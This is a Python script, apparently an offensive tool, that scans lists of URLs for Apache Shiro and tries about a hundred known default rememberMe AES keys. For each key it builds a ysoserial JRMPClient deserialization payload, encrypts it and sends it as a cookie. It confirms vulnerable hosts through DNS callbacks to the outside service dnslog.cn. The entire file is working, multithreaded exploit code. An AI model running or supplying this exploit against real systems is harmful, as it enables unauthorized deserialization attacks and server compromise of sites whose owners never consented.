# -*- encoding: utf-8 -*-

import os
import re
import base64
import uuid,time
import subprocess
import requests,sys
from Crypto.Cipher import AES
import random,argparse,Queue,threading
import warnings
import requests


warnings.filterwarnings("ignore")
JAR_FILE = './ysoserial.jar'
scan_count = 0
vuln_count = 0
success = []
session = requests.Session()

def poc(url, rce_command,key_):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    try:
        payload = generator(rce_command, JAR_FILE,key_) # 生成payload
        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10,verify=False)  # 发送验证请求
    except Exception, e:
        return True
    return True


def generator(command, fp,key_):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    popen = subprocess.Popen(['java', '-jar', fp, 'JRMPClient', command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key_), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

#取得随机数
def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("QWERTYUIOPASDFGHJKLZXCVBNM1234567890"))
    return str(str1)

def getdomain():
    try :
        ret = session.get("http://www.dnslog.cn/getdomain.php?t="+str(random.randint(100000,999999)),timeout=10).text
    except Exception as e:
        print("getdomain error:" + str(e))
        ret = "error"
        pass
    return ret

def getrecord():
    try :
        ret = session.get("http://www.dnslog.cn/getrecords.php?t="+str(random.randint(100000,999999)),timeout=10).text
        #print(ret)
    except Exception as e:
        print("getrecord error:" + str(e))
        ret = "error"
        pass
    return ret

def getdnshost():
    reversehost = ""
    try :
        domain = getdomain()
        if domain=="error":
            print("getdomain error")
        else:
            #reversehost = "http://" +domain
            reversehost = domain
            #print("got reversehost : " + reversehost)
    except:
        pass
    return reversehost

def detect(url_list):
    shiro_url_list = []
    for url in url_list:
        if '://' not in url:
            target = 'https://%s' % url if ':443' in url else 'http://%s' % url
        else:
            target = url
        try:
            r = requests.post(target, cookies={'rememberMe': '1'}, timeout=10,verify=False)
        except Exception, e:
            pass
        headers = r.headers.get('Set-Cookie')
        if not headers is None:
            if 'rememberMe=deleteMe' in headers:
                shiro_url_list.append(target)
                print "[+] Detect Shiro url: %s." % (target)
        else:
            print "[-] Detect Valid Shiro url: %s." % (target)
    return shiro_url_list

def check_vuln():
    key = {
    "kPH+bIxk5D2deZiIxcaaaA==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
    "0AvVhmFLUs0KTA3Kprsdag==",
    "1AvVhdsgUs0FSA3SDFAdag==",
    "1QWLxg+NYmxraMoxAXu/Iw==",
    "25BsmdYwjnfcWmnhAciDDg==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "3JvYhmBLUs0ETA5Kprsdag==",
    "r0e3c16IdVkouZgk1TKVMg==",
    "5aaC5qKm5oqA5pyvAAAAAA==",
    "5AvVhmFLUs0KTA3Kprsdag==",
    "6AvVhmFLUs0KTA3Kprsdag==",
    "6NfXkC7YVCV5DASIrEm1Rg==",
    "6ZmI6I2j5Y+R5aSn5ZOlAA==",
    "cmVtZW1iZXJNZQAAAAAAAA==",
    "7AvVhmFLUs0KTA3Kprsdag==",
    "8AvVhmFLUs0KTA3Kprsdag==",
    "8BvVhmFLUs0KTA3Kprsdag==",
    "9AvVhmFLUs0KTA3Kprsdag==",
    "OUHYQzxQ/W9e/UjiAGu6rg==",
    "a3dvbmcAAAAAAAAAAAAAAA==",
    "aU1pcmFjbGVpTWlyYWNsZQ==",
    "bWljcm9zAAAAAAAAAAAAAA==",
    "bWluZS1hc3NldC1rZXk6QQ==",
    "bXRvbnMAAAAAAAAAAAAAAA==",
    "ZUdsaGJuSmxibVI2ZHc9PQ==",
    "wGiHplamyXlVB11UXWol8g==",
    "U3ByaW5nQmxhZGUAAAAAAA==",
    "MTIzNDU2Nzg5MGFiY2RlZg==",
    "L7RioUULEFhRyxM7a2R/Yg==",
    "a2VlcE9uR29pbmdBbmRGaQ==",
    "WcfHGU25gNnTxTlmJMeSpw==",
    "OY//C4rhfwNxCQAQCrQQ1Q==",
    "5J7bIJIV0LQSN3c9LPitBQ==",
    "f/SY5TIve5WWzT4aQlABJA==",
    "bya2HkYo57u6fWh5theAWw==",
    "WuB+y2gcHRnY2Lg9+Aqmqg==",
    "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
    "3qDVdLawoIr1xFd6ietnwg==",
    "ZWvohmPdUsAWT3=KpPqda",
    "YI1+nBV//m7ELrIyDHm6DQ==",
    "6Zm+6I2j5Y+R5aS+5ZOlAA==",
    "2A2V+RFLUs+eTA3Kpr+dag==",
    "6ZmI6I2j3Y+R1aSn5BOlAA==",
    "SkZpbmFsQmxhZGUAAAAAAA==",
    "2cVtiE83c4lIrELJwKGJUw==",
    "fsHspZw/92PrS3XrPW+vxw==",
    "XTx6CKLo/SdSgub+OPHSrw==",
    "sHdIjUN6tzhl8xZMG3ULCQ==",
    "O4pdf+7e+mZe8NyxMTPJmQ==",
    "HWrBltGvEZc14h9VpMvZWw==",
    "rPNqM6uKFCyaL10AK51UkQ==",
    "Y1JxNSPXVwMkyvES/kJGeQ==",
    "lT2UvDUmQwewm6mMoiw4Ig==",
    "MPdCMZ9urzEA50JDlDYYDg==",
    "xVmmoltfpb8tTceuT5R7Bw==",
    "c+3hFGPjbgzGdrC+MHgoRQ==",
    "ClLk69oNcA3m+s0jIMIkpg==",
    "Bf7MfkNR0axGGptozrebag==",
    "1tC/xrDYs8ey+sa3emtiYw==",
    "ZmFsYWRvLnh5ei5zaGlybw==",
    "cGhyYWNrY3RmREUhfiMkZA==",
    "IduElDUpDDXE677ZkhhKnQ==",
    "yeAAo1E8BOeAYfBlm4NG9Q==",
    "cGljYXMAAAAAAAAAAAAAAA==",
    "2itfW92XazYRi5ltW0M2yA==",
    "XgGkgqGqYrix9lI6vxcrRw==",
    "ertVhmFLUs0KTA3Kprsdag==",
    "5AvVhmFLUS0ATA4Kprsdag==",
    "s0KTA3mFLUprK4AvVhsdag==",
    "hBlzKg78ajaZuTE0VLzDDg==",
    "9FvVhtFLUs0KnA3Kprsdyg==",
    "d2ViUmVtZW1iZXJNZUtleQ==",
    "yNeUgSzL/CfiWw1GALg6Ag==",
    "NGk/3cQ6F5/UNPRh8LpMIg==",
    "4BvVhmFLUs0KTA3Kprsdag==",
    "MzVeSkYyWTI2OFVLZjRzZg==",
    "CrownKey==a12d/dakdad",
    "empodDEyMwAAAAAAAAAAAA==",
    "A7UzJgh1+EWj5oBFi+mSgw==",
    "YTM0NZomIzI2OTsmIzM0NTueYQ==",
    "c2hpcm9fYmF0aXMzMgAAAA==",
    "i45FVt72K2kLgvFrJtoZRw==",
    "U3BAbW5nQmxhZGUAAAAAAA==",
    "ZnJlc2h6Y24xMjM0NTY3OA==",
    "Jt3C93kMR9D5e8QzwfsiMw==",
    "MTIzNDU2NzgxMjM0NTY3OA==",
    "vXP33AonIp9bFwGl7aT7rA==",
    "V2hhdCBUaGUgSGVsbAAAAA==",
    "Z3h6eWd4enklMjElMjElMjE=",
    "Q01TX0JGTFlLRVlfMjAxOQ==",
    "ZAvph3dsQs0FSL3SDFAdag==",
    "Is9zJ3pzNh2cgTHB4ua3+Q==",
    "NsZXjXVklWPZwOfkvk6kUA==",
    "GAevYnznvgNCURavBhCr1w==",
    "66v1O8keKNV3TTcGPK1wzg==",
    "SDKOLKn2J1j/2BHjeZwAoQ=="
    }
    global scan_count,vuln_count

    while True:
        try :
            web_url = queue.get(timeout=0.1)
            scan_count+=1
        except:
            break
        try:
            for key_ in key:
                random_str_ = random_str(8)
                connect = poc(web_url,random_str_ + "." + domain,key_)
                print "[*] Trying url:%s , key:%s. " % (web_url,key_)
                if connect == False:
                    break
                result = getrecord()
                if (random_str_ + '.' + domain) in result:
                    print "[+200] vuln apache shiro",web_url,key_
                    success.append((web_url,key_))
                    vuln_count+=1
                    break
                else:
                    pass
        except Exception,e:
            pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
                                    description='Apache Shiro Scanner.',
                                    usage='scan.py [optional]')
    parser.add_argument('-f',metavar='File',type=str,default='url.txt',help='Put Web url in url.txt')
    parser.add_argument('-u',metavar='Url',type=str,help='Put a Web url')
    parser.add_argument('-t',metavar='THREADS',type=int,default='10',help='Num of scan threads,default 10')

    #global domain, reversehost
    global domain
    domain = getdnshost()
    #if domain:
    #    reversehost = "http://" + domain
    #    print "[*] domain: %s. reversehost: %s." % (domain, reversehost)
    print "[*] domain: %s." % (domain)
    if len(sys.argv)==1:
        sys.argv.append('-h')
    args = parser.parse_args()
    start_time = time.time()
    detect_web_url = []
    shiro_web_url = []
    if args.u is None:
        for web_url in open(args.f).xreadlines():
            web_url = web_url.strip()
            if not web_url:
                continue
            detect_web_url.append(web_url)
        shiro_web_url = detect(detect_web_url)
        print "[*] Detect Shiro_web_url: %s." % (shiro_web_url)
        if shiro_web_url != []:
            #将存在shiro的url放入队列
            queue = Queue.Queue()
            for web_url in shiro_web_url:
                queue.put(web_url)
            #for web_url in open(args.f).xreadlines():
            #    web_url = web_url.strip() 
            #    if not web_url:
            #        continue
            #    queue.put(web_url)

            #开启多线程访问
            threads = []
            for i in range(args.t):
                t = threading.Thread(target=check_vuln)
                threads.append(t)
                t.start()

            for t in threads:
                t.join()
        
    else:
        queue = Queue.Queue()
        queue.put(args.u)
        check_vuln()
    print ('[+] Done. %s weburl scanned %s available %.1f seconds.' % (scan_count,vuln_count,time.time() - start_time))
    print "\n"
    for success_list in success:
        print "[+] Vuln urls:%s, key:%s." % (success_list[0],success_list[1])
